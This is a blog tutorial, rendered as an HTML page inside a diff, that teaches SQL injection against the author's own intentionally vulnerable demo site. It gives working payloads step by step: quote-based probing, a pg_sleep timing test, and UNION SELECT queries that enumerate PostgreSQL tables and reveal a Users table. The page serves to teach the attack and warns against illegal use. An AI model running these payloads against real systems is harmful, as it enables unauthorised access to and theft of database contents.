@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Practice of SQL Injection | rmauro.dev {blog}</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="First, do you know (or remember) what SQL Injection is? (para versão em português)
+According to OWASP.org (https://www.owasp.org/index.php/SQL_Injection).
+A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.
+That is, a web service technique invasion through SQL commands.As long as the web service (website, webservice, REST API, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.">
+    <meta name="generator" content="Hugo 0.130.0">
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/post/practice-of-sql-injection/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/post/practice-of-sql-injection/">
+  <meta property="og:site_name" content="rmauro.dev {blog}">
+  <meta property="og:title" content="Practice of SQL Injection">
+  <meta property="og:description" content="First, do you know (or remember) what SQL Injection is? (para versão em português)
+According to OWASP.org (https://www.owasp.org/index.php/SQL_Injection).
+A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.
+That is, a web service technique invasion through SQL commands.As long as the web service (website, webservice, REST API, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2019-12-14T18:38:29+00:00">
+    <meta property="article:modified_time" content="2019-12-14T18:38:29+00:00">
+    <meta property="article:tag" content="Hack">
+    <meta property="article:tag" content="En">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Websecurity">
+
+  <meta itemprop="name" content="Practice of SQL Injection">
+  <meta itemprop="description" content="First, do you know (or remember) what SQL Injection is? (para versão em português)
+According to OWASP.org (https://www.owasp.org/index.php/SQL_Injection).
+A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.
+That is, a web service technique invasion through SQL commands.As long as the web service (website, webservice, REST API, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.">
+  <meta itemprop="datePublished" content="2019-12-14T18:38:29+00:00">
+  <meta itemprop="dateModified" content="2019-12-14T18:38:29+00:00">
+  <meta itemprop="wordCount" content="1159">
+  <meta itemprop="keywords" content="Hack,En,Security,Websecurity">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Practice of SQL Injection">
+  <meta name="twitter:description" content="First, do you know (or remember) what SQL Injection is? (para versão em português)
+According to OWASP.org (https://www.owasp.org/index.php/SQL_Injection).
+A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.
+That is, a web service technique invasion through SQL commands.As long as the web service (website, webservice, REST API, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.">
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        rmauro.dev {blog}
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      
+<div class="ananke-socials">
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">Practice of SQL Injection</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2019-12-14T18:38:29Z">December 14, 2019</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h2 id="first-do-you-know-or-remember-what-sql-injection-is">First, do you know (or remember) what SQL Injection is?</h2>
+<p><em>(para versão em <a href="__GHOST_URL__/sql-injection-na-pratica/">português</a>)</em></p>
+<p>According to OWASP.org (<a href="https://www.owasp.org/index.php/SQL_Injection)">https://www.owasp.org/index.php/SQL_Injection)</a>.</p>
+<blockquote>
+<p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.</p>
+</blockquote>
+<p>That is, a web service technique invasion through SQL commands.As long as the web service (<em>website</em>, <em>webservice</em>, <em>REST API</em>, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.</p>
+<p>For example, we can access the system user table and get information not covered by the API.</p>
+<p><strong>Note: Even today we can find this kind of glitch in web services (websites and web services)! : (</strong></p>
+<p>##Our lab (site that failed on purpose)</p>
+<p><a href="https://rmauro-failure.herokuapp.com/">https://rmauro-failure.herokuapp.com/</a></p>
+<p><strong>Please note:</strong> Understand that run this attack is against the law. Don&rsquo;t do it in the real world unless you are hired for it (white hat hacker), even for study purposes.</p>
+<p>What we are doing here is a test on <strong>my test site</strong>, which I produced for this purpose.</p>
+<p>In that case we can :)
+OK? You are free to run the tests on this site.</p>
+<p>##Getting familiar with the vulnerable site</p>
+<p>Open site <a href="https://rmauro-failure.herokuapp.com/">https://rmauro-failure.herokuapp.com/</a></p>
+<p><img src="https://res-1.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/1-1.png" alt="1-1"></p>
+<p>This is the <em>website</em> that we are going to work on, in the text box (<em>enter a product name</em>) is where we can search by product name and also perform our <em>attack</em>.</p>
+<p><strong>ATTACK!!! GO, GO, GO.</strong></p>
+<p>Studying the <em>rmauro-failure</em> System</p>
+<p>First enter in the search field the value Hammer and search.</p>
+<p><img src="https://res-5.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/2.png" alt="2"></p>
+<p>Let&rsquo;s think for a moment and try to understand how it works behind the scenes - * code behind * if you allow me.</p>
+<p><img src="https://res-4.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/sql-inje.jpg" alt="Sql-inje"></p>
+<ol>
+<li>The system collects the entered value, Hammer, the search field;</li>
+<li>Send to the <em>trainer</em>, or <em>concatenator</em>, of SQL by concatenating the String sent with the rest of the query;</li>
+<li>When formed, the <strong>SQL command</strong> is sent to the database, any relational database;</li>
+<li>The database processes your request and returns to the program with the result;</li>
+<li>Once executed by the database, the program parses the result to object (s) in memory, processes it and sends it to the caller, in this case the screen;</li>
+<li>Browser shows the return (HTML) on the screen.</li>
+</ol>
+<p>This is the basic flow of the system. Simple, right?</p>
+<h3 id="hammer-time---time-to-attack-the-system"><em>Hammer time</em> - Time to attack the system</h3>
+<p>First let&rsquo;s run some tests.</p>
+<ol>
+<li>Enter in the search field the value &rsquo; (single quotes) and hit the search button, Search.</li>
+</ol>
+<p><img src="https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/3.png" alt="3"></p>
+<p><img src="https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/4.png" alt="4"></p>
+<p>The result should be an <strong>red error</strong> like this. Perfect!</p>
+<p>This means that the system is dynamically assembling Query SQL without any handling of the input parameters.</p>
+<p>Let&rsquo;s think a little. What will be the query generated and sent to the database?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#f92672">?</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span></code></pre></div><p>Something close to this that caused the explosion!</p>
+<p>We do not know which table is used or the table fields, but we do know what the basic structure of a SQL SELECT command looks like.</p>
+<p>####Let&rsquo;s explore a little more</p>
+<p>Now test the search field with <code>mmer</code>.</p>
+<p><img src="https://res-4.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/5.png" alt="5"></p>
+<p>Note that there was return, then we can infer that the query is something like.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span>
+</span></span></code></pre></div><p>We came to the conclusion that we have control over what we write in the final part of query, just where mmer goes, the other parts of the command we cannot control.</p>
+<blockquote>
+<p>But this small part can cause disaster.</p>
+</blockquote>
+<p>####Finding out which database we are working on</p>
+<p>1- Our query is formed by &hellip; ok, we already know that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span>
+</span></span></code></pre></div><p>2- Now let&rsquo;s modify it to &hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%&#39;</span>;<span style="color:#75715e">--%&#39;
+</span></span></span></code></pre></div><p>This will cause the SQL command to end, proving that we can modify it as we wish.</p>
+<p>3- Let&rsquo;s try it out. Type in the search field <code>';--</code></p>
+<p><img src="https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/6.png" alt="6"></p>
+<p>Increasingly interesting. Now we got all database records (same as before) with the new query.</p>
+<p>4 - Cool, let&rsquo;s try to find out which is the database in question (MySql, Sql Server, Oracle, PostgreSql, etc). To find out let&rsquo;s execute a function that only works on a specific database (nothing standand like SELECT / INSERT or DELETE). Something like the <code>Sleep</code> function.</p>
+<blockquote>
+<p>Don&rsquo;t forget that this system was designed by me, so I know the database is <em>PostgreSql</em>, so let&rsquo;s go straight to the point and execute the <code>pg_sleep()</code> (sleep from <strong>PostgreSql</strong>).</p>
+</blockquote>
+<blockquote>
+<p>So we do not waste time testing various possibilities for various databases.</p>
+</blockquote>
+<p>5 - Execute in the search field the value <code>mmer%';SELECT pg_sleep(10);--</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span>;<span style="color:#66d9ef">SELECT</span> pg_sleep(<span style="color:#ae81ff">10</span>);<span style="color:#75715e">--%&#39;
+</span></span></span></code></pre></div><p>Note that it takes precisely 10 seconds to return the answer. <strong>Perfect!</strong></p>
+<p>But what if it&rsquo;s not working?
+Easy, just swap PostgreSql&rsquo;s <code>sleep</code> function for a specific one from another database until you find the database we&rsquo;re working on. In this case there is no magic.</p>
+<h4 id="finding-out-which-tables-exist-in-the-database">Finding out which tables exist in the database</h4>
+<p>Cool so far, isn&rsquo;t it ?! What else can we do with our query? Everything, or almost everything &hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span>;<span style="color:#66d9ef">SELECT</span> pg_sleep(<span style="color:#ae81ff">10</span>);<span style="color:#75715e">--%&#39;
+</span></span></span></code></pre></div><p>This is the last query we ran. Think now about the possibilities.</p>
+<p>Since we know the database is <strong>PostgreSql</strong>. Now let&rsquo;s try to find <strong>tables</strong>.</p>
+<p>First we need to understand the SQL return structure, the columns.
+Our feedback should be around three columns.</p>
+<p>Three columns because the product shown on the screen contains an <code>Id</code>, <code>Name</code> and a <code>Price</code>.</p>
+<p>(3 | Hammer Drills | 22.3)</p>
+<p>Ok, ok. It may not be exactly three columns, but let&rsquo;s try with 3 for now (remember I designed the system).</p>
+<p>Now let&rsquo;s use the <code>UNION</code> command from <code>SQL</code>. This allows us to merge two results into a single result or <code>Dataset</code>.</p>
+<p><img src="https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/union-sql-1.png" alt="union-sql-1"></p>
+<p>Let&rsquo;s use this to return product data <strong>and</strong> something that interests us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span>
+</span></span></code></pre></div><p>Let&rsquo;s modify our <em>query</em> to use <code>UNION</code> statment and bring the values <strong>1, 2, 3</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>;<span style="color:#75715e">--
+</span></span></span></code></pre></div><p><img src="https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/7.png" alt="7"></p>
+<p>This yielded the feedback we already know plus a row containing the values &ldquo;1&rdquo;, &ldquo;2&rdquo; and &ldquo;3&rdquo;, also validating our three column hypothesis.</p>
+<p>Let&rsquo;s move on to the ** tables ** now.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%mmer%&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>;<span style="color:#75715e">--
+</span></span></span></code></pre></div><p><em>Our current command.</em></p>
+<p>The command below is able to return the <code>Schema</code> tables from the <em>PostgreSql</em> database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;public&#39;</span>
+</span></span></code></pre></div><p><img src="https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/sql-schema.png" alt="sql-schema"></p>
+<p>*Expected outcome. System Tables *</p>
+<p>Let&rsquo;s introduce our <code>Query</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;public&#39;</span>
+</span></span></code></pre></div><p>Put in the search field <code>mmer%'UNION  SELECT &quot;table_name&quot;, &quot;table_schema&quot;, &quot;table_catalog&quot; FROM information_schema.tables WHERE table_schema='public'--</code></p>
+<p>Creating the <code>QUERY</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span> <span style="color:#66d9ef">from</span> <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;table_name&#34;</span>, <span style="color:#e6db74">&#34;table_catalog&#34;</span>, <span style="color:#e6db74">&#34;table_schema&#34;</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;public&#39;</span>
+</span></span></code></pre></div><p><img src="https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/result-tables.png" alt="result-tables"></p>
+<p>We found the <strong>Product</strong> and <strong>Users</strong> tables.</p>
+<p>Now it&rsquo;s your turn. From here you should only extrapolate and explore the possibilities.</p>
+<h2 id="website-source-code">Website Source Code</h2>
+<blockquote>
+<p><a href="https://github.com/bootcamp-bbq/SqlInjection-Lab.git">https://github.com/bootcamp-bbq/SqlInjection-Lab.git</a></p>
+</blockquote>
+<h2 id="references-used">References Used:</h2>
+<blockquote>
+<p><a href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a>
+<a href="https://youtu.be/ciNHn38EyRc">https://youtu.be/ciNHn38EyRc</a></p>
+</blockquote>
+<ul class="pa0">
+  
+   <li class="list di">
+     <a href="/tags/hack/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Hack</a>
+   </li>
+  
+   <li class="list di">
+     <a href="/tags/en/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">En</a>
+   </li>
+  
+   <li class="list di">
+     <a href="/tags/security/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Security</a>
+   </li>
+  
+   <li class="list di">
+     <a href="/tags/websecurity/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Websecurity</a>
+   </li>
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">Related</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
+          <a href="/post/hsts-definition-and-how-to-enable-it-in-iis/">HSTS - What&#39;s it and how to enable it in IIS</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/sql-injection-na-pratica/">SQL Injection na Prática - Executando o Ataque</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/csharp-implicit-conversion-cast-explicit-conversion/">C# Conversions - Casting, implicit and explicit conversion</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/deploying-net-container-app-to-heroku-cloud/">Deploying .Net container App to Heroku cloud</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/azure-kubernets-az-cli/">Azure Kubernets - az cli</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/demo-azure-batch/">Demo - Azure Batch</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/azcli-create-resource-though-resource-file/">az cli (bash) create resource though Resource File</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/enable-local-cache-in-azure-web-app/">Enable Local Cache in Azure Web App</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/c-datetime-tostring-format/">C# DateTime Cheat sheet - ToString() Format</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/demo-webjob-azure-cron-expressions/">Demo WebJob Azure - CRON expressions</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/enable-azure-disk-encryption-though-az-cli/">Enable Azure Disk Encryption though az-cli</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/create-azure-vm-though-powershell/">Create Azure VM though PowerShell</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/how-to-migrate-asp-net-core-1-0-to-1-1/">How to migrate .Net Core 1.0 to 1.1</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  rmauro.dev {blog} 2024 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
